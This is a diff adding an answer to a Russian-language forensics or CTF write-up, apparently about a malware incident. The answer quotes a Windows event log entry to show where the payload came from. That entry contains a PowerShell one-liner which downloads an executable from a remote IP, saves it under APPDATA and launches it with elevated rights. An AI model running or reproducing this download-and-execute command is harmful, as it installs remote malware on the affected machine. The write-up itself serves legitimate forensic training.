@@ -72,7 +72,12 @@ Upgrade-Insecure-Requests: 1
 
 ### 2. С какого сервера была скачана полезная нагрузка? (5 PTS)
 
-...
+Рассмотрим журнал логирования событий Windows. В ходе поиска по ключевому слову `http://` мы нашли следующее вхождение:
+```
+ProviderName=FileSystem NewProviderState=Started SequenceNumber=7 HostName=ConsoleHost HostVersion=5.1.19041.906 HostId=9da22629-af52-4b50-a1e3-c0b8ad39c1a1 HostApplication=powershell -command ($drop=Join-Path -Path $env:APPDATA -ChildPath Rjomba.exe);(New-Object System.Net.WebClient).DownloadFile('http://95.169.192.220:8080/prikol.exe', $drop); Start-Process -Verb runAs $drop EngineVersion= RunspaceId= PipelineId= CommandName= CommandType= ScriptName= CommandPath= CommandLine=
+```
+
+Cледовательно, файл был скачан с сервера `95.169.192.220`.
 
 ### 3. С помощью какой уязвимости данное ВПО запустилось? В каком ПО? (5 PTS)
 
